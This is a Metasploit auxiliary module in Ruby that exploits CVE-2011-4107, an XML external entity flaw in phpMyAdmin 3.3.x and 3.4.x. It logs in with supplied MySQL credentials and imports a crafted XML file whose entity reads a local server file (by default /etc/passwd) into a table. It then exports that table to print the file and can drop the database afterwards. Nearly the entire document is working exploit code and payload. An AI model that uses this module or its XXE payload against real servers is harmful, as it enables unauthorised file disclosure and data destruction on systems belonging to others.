# Date: 12-01-2012
# Author: Marco Batista
# Blog Link: http://www.secforce.com/blog/2012/01/cve-2011-4107-poc-phpmyadmin-local-file-inclusion-via-xxe-injection/
# Tested on: Windows and Linux - phpmyadmin versions: 3.3.6, 3.3.10, 3.4.0, 3.4.5, 3.4.7
# CVE : CVE-2011-4107
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize
        super(
            &#039;Name&#039;        => &#039;phpMyAdmin 3.3.X and 3.4.X - Local File Inclusion via XXE Injection&#039;,
            &#039;Version&#039;     => &#039;1.0&#039;,
            &#039;Description&#039; => %q{Importing a specially-crafted XML file which contains an XML entity injection permits to retrieve a local file (limited by the privileges of the user running the web server).
            The attacker must be logged in to MySQL via phpMyAdmin.
            Works on Windows and Linux Versions 3.3.X and 3.4.X},
            &#039;References&#039;  =>
                [
                    [ &#039;CVE&#039;, &#039;2011-4107&#039; ],
                                        [ &#039;OSVDB&#039;, &#039;76798&#039; ],
                                        [ &#039;BID&#039;, &#039;50497&#039; ],
                                        [ &#039;URL&#039;, &#039;http://secforce.com/research/&#039;],
                ],
            &#039;Author&#039;      => [ &#039;Marco Batista&#039; ],
            &#039;License&#039;     => MSF_LICENSE
            )
 
        register_options(
            [
                Opt::RPORT(80),
                OptString.new(&#039;FILE&#039;, [ true,  "File to read", &#039;/etc/passwd&#039;]),
                OptString.new(&#039;USER&#039;, [ true,  "Username", &#039;root&#039;]),
                OptString.new(&#039;PASS&#039;, [ false,  "Password", &#039;password&#039;]),
                OptString.new(&#039;DB&#039;, [ true,  "Database to use/create", &#039;hddaccess&#039;]),
                OptString.new(&#039;TBL&#039;, [ true,  "Table to use/create and read the file to", &#039;files&#039;]),
                OptString.new(&#039;APP&#039;, [ true,  "Location for phpMyAdmin URL", &#039;/phpmyadmin&#039;]),
                OptString.new(&#039;DROP&#039;, [ true,  "Drop database after reading file?", &#039;true&#039;]),
            ],self.class)
    end
 
    def loginprocess
        # HTTP GET TO GET SESSION VALUES
        getresponse = send_request_cgi({
            &#039;uri&#039;     => datastore[&#039;APP&#039;]+&#039;/index.php&#039;,
            &#039;method&#039;  => &#039;GET&#039;,
            &#039;version&#039; => &#039;1.1&#039;,
            }, 25)
 
        if (getresponse.nil?)
            print_error("no response for #{ip}:#{rport}")
        elsif (getresponse.code == 200)
            print_status("Received #{getresponse.code} from #{rhost}:#{rport}")
        elsif (getresponse and getresponse.code == 302 or getresponse.code == 301)
            print_status("Received 302 to #{getresponse.headers[&#039;Location&#039;]}")
        else
            print_error("Received #{getresponse.code} from #{rhost}:#{rport}")
        end
 
        valuesget = getresponse.headers["Set-Cookie"]
        varsget = valuesget.split(" ")
 
        #GETTING THE VARIABLES NEEDED
        phpMyAdmin = varsget.grep(/phpMyAdmin/).last
        pma_mcrypt_iv = varsget.grep(/pma_mcrypt_iv/).last
        # END HTTP GET
 
        # LOGIN POST REQUEST TO GET COOKIE VALUE
        postresponse = send_request_cgi({
            &#039;uri&#039;     => datastore[&#039;APP&#039;]+&#039;/index.php&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;headers&#039; =>{
                    &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;,
                    &#039;Cookie&#039; => "#{pma_mcrypt_iv} #{phpMyAdmin}"
                            },
            &#039;data&#039;    => &#039;pma_username=&#039;+datastore[&#039;USER&#039;]+&#039;&pma_password=&#039;+datastore[&#039;PASS&#039;]+&#039;&server=1&#039;
            }, 25)     
 
        if (postresponse["Location"].nil?)
            print_status("TESTING#{postresponse.body.split("&#039;").grep(/token/).first.split("=").last}")
            tokenvalue = postresponse.body.split("&#039;").grep(/token/).first.split("=").last          
        else
            tokenvalue = postresponse["Location"].split("&").grep(/token/).last.split("=").last
        end
         
         
        valuespost = postresponse.headers["Set-Cookie"]
        varspost = valuespost.split(" ")
         
        #GETTING THE VARIABLES NEEDED
        pmaUser = varspost.grep(/pmaUser-1/).last
        pmaPass = varspost.grep(/pmaPass-1/).last
 
        return "#{pma_mcrypt_iv} #{phpMyAdmin} #{pmaUser} #{pmaPass}",tokenvalue
        # END OF LOGIN POST REQUEST
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, Rex::ConnectionError =>e
            print_error(e.message)
        rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e
            print_error(e.message)
    end
 
    def readfile(cookie,tokenvalue)
        #READFILE TROUGH EXPORT FUNCTION IN PHPMYADMIN
        getfiles = send_request_cgi({
            &#039;uri&#039;     => datastore[&#039;APP&#039;]+&#039;/export.php&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;headers&#039; =>{
                    &#039;Cookie&#039; => cookie
                        },
            &#039;data&#039;    => &#039;db=&#039;+datastore[&#039;DB&#039;]+&#039;&table=&#039;+datastore[&#039;TBL&#039;]+&#039;&token=&#039;+tokenvalue+&#039;&single_table=TRUE&export_type=table&sql_query=SELECT+*+FROM+%60files%60&what=texytext&texytext_structure=something&texytext_data=something&texytext_null=NULL&asfile=sendit&allrows=1&codegen_structure_or_data=data&texytext_structure_or_data=structure_and_data&yaml_structure_or_data=data&#039;
            }, 25)
         
        if (getfiles.body.split("\n").grep(/== Dumping data for table/).empty?)
            print_error("Error reading the file... not enough privilege? login error?")        
        else
            print_status("#{getfiles.body}")
        end
    end
 
 
    def dropdatabase(cookie,tokenvalue)
        dropdb = send_request_cgi({
            &#039;uri&#039;     => datastore[&#039;APP&#039;]+&#039;/sql.php?sql_query=DROP+DATABASE+%60&#039;+datastore[&#039;DB&#039;]+&#039;%60&back=db_operations.php&goto=main.php&purge=1&token=&#039;+tokenvalue+&#039;&is_js_confirmed=1&ajax_request=false&#039;,
            &#039;method&#039;  => &#039;GET&#039;,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;headers&#039; =>{
                    &#039;Cookie&#039; => cookie
                        },
            }, 25)
 
            print_status("Dropping database: "+datastore[&#039;DB&#039;])
    end
 
    def run
        cookie,tokenvalue = loginprocess()
     
        print_status("Login at #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}#{datastore[&#039;APP&#039;]} using #{datastore[&#039;USER&#039;]}:#{datastore[&#039;PASS&#039;]}")
     
        craftedXML =  "------WebKitFormBoundary3XPL01T\n"
        craftedXML << "Content-Disposition: form-data; name=\"token\"\n\n"
        craftedXML << tokenvalue+"\n"
        craftedXML << "------WebKitFormBoundary3XPL01T\n"
        craftedXML << "Content-Disposition: form-data; name=\"import_type\"\n\n"
        craftedXML << "server\n"
        craftedXML << "------WebKitFormBoundary3XPL01T\n"
        craftedXML << "Content-Disposition: form-data; name=\"import_file\"; filename=\"exploit.xml\"\n"
        craftedXML << "Content-Type: text/xml\n\n"
        craftedXML << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
        craftedXML << "<!DOCTYPE ficheiro [  \n"
        craftedXML << "  <!ENTITY conteudo SYSTEM \"file:///#{datastore[&#039;FILE&#039;]}\" >]>\n"
        craftedXML << "<pma_xml_export version=\"1.0\" xmlns:pma=\"http://www.phpmyadmin.net/some_doc_url/\">\n"
        craftedXML << "    <pma:structure_schemas>\n"
        craftedXML << "        <pma:database name=\""+datastore[&#039;DB&#039;]+"\" collation=\"utf8_general_ci\" charset=\"utf8\">\n"
        craftedXML << "            <pma:table name=\""+datastore[&#039;TBL&#039;]+"\">\n"
        craftedXML << "                CREATE TABLE `"+datastore[&#039;TBL&#039;]+"` (`file` varchar(20000) NOT NULL);\n"
        craftedXML << "            </pma:table>\n"
        craftedXML << "        </pma:database>\n"
        craftedXML << "    </pma:structure_schemas>\n"
        craftedXML << "    <database name=\""+datastore[&#039;DB&#039;]+"\">\n"
        craftedXML << "        <table name=\""+datastore[&#039;TBL&#039;]+"\">\n"
        craftedXML << "            <column name=\"file\">&conteudo;</column>\n"
        craftedXML << "        </table>\n"
        craftedXML << "    </database>\n"
        craftedXML << "</pma_xml_export>\n\n"
        craftedXML << "------WebKitFormBoundary3XPL01T\n"
        craftedXML << "Content-Disposition: form-data; name=\"format\"\n\n"
        craftedXML << "xml\n"
        craftedXML << "------WebKitFormBoundary3XPL01T\n"
        craftedXML << "Content-Disposition: form-data; name=\"csv_terminated\"\n\n"
        craftedXML << ",\n\n"
        craftedXML << "------WebKitFormBoundary3XPL01T--"
         
     
        print_status("Grabbing that #{datastore[&#039;FILE&#039;]} you want...")
        res = send_request_cgi({
            &#039;uri&#039;     => datastore[&#039;APP&#039;]+&#039;/import.php&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;headers&#039; =>{
                    &#039;Content-Type&#039; => &#039;multipart/form-data; boundary=----WebKitFormBoundary3XPL01T&#039;,
                    &#039;Cookie&#039; => cookie
                        },
            &#039;data&#039;    => craftedXML
        }, 25)
 
        readfile(cookie,tokenvalue)
 
        if (datastore[&#039;DROP&#039;] == "true")
            dropdatabase(cookie,tokenvalue)
        else
            print_status("Database was not dropped: "+datastore[&#039;DB&#039;])         
        end
 
    end
end



